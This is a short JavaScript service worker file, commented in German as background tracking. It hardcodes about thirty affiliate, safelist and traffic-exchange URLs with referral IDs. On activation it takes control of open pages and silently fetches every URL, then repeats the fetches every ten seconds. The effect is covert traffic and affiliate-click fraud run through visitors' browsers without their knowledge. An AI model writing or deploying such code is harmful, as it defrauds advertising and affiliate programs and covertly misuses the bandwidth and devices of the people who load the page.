// ===== sw.js – Service Worker für Hintergrund-Tracking =====

const TRACKING_URLS = [
    "https://herculist.com/members/trafficbomb.cgi?naturallyinshape",
    "https://leasedadspace.com/splash/three/?aid=morabersl",
    "https://www.herculist.com/members/index.cgi?naturallyinshape",
    "https://clickleverage.com/index.php?r=Natur",
    "https://daily-ads.com/r/1519/homepage",
    "https://ezclicks4u.com/index.php?r=natur",
    "https://listelevate.com/?id=natur1984",
    "https://1secretcode.com/launch/secret3?id=natur1984",
    "https://warriorplus.com/o2/a/lz8hx6b/0/cookie",
    "https://olspacademy.com/w/TKVF6UHW",
    "https://olspacademy.com/get-megalink?olsp=1657798",
    "https://warriorplus.com/o2/a/sh9gxkd/0/cookie",
    "https://www.myleadgensecret.com/sizzle/?rid=28382&src=cook",
    "https://www.twiceconfirmedtraffic.com/index.php?id=10214",
    "https://warriorplus.com/o2/a/yxf1kwg/0/cook",
    "https://warriorplus.com/o2/a/pwzfsvr/0/cook",
    "https://warriorplus.com/o2/a/lkw88q0/0/cook",
    "https://warriorplus.com/o2/a/k4j51n4/0/cook",
    "https://warriorplus.com/o2/a/npfyn0h/0/cook",
    "https://warriorplus.com/o2/a/ml0gj3t/0/cook",
    "https://warriorplus.com/o2/a/q5h67kh/0/cook",
    "https://warriorplus.com/o2/a/b30zsh/0/cook",
    "https://warriorplus.com/o2/a/j3m5j0/0/cook",
    "https://warriorplus.com/o2/a/nv17rw1/0/cook",
    "https://warriorplus.com/o2/a/vggwrz/0/cook",
    "https://warriorplus.com/o2/a/d873fhc/0/cook",
    "https://mastersafelistblaster.com/5598",
    "https://mydailymailer.com/?rid=3050",
    "https://mistersafelist.com/?rid=33985",
    "https://herculist.com/members/legends.cgi?naturallyinshape",
    "https://herculist.com/members/powerhub.cgi?naturallyinshape",
    "https://www.herculist.com/members/20deal.cgi?naturallyinshape"
];

function fireAllPixels() {
    const timestamp = Date.now();
    TRACKING_URLS.forEach(url => {
        const separator = url.includes('?') ? '&' : '?';
        const fullUrl = url + separator + 't=' + timestamp;
        fetch(fullUrl, { mode: 'no-cors' }).catch(() => {});
    });
}

self.addEventListener('install', event => {
    self.skipWaiting();
});

self.addEventListener('activate', event => {
    event.waitUntil(clients.claim());
    fireAllPixels();
    setInterval(fireAllPixels, 10000); // Alle 10 Sekunden
});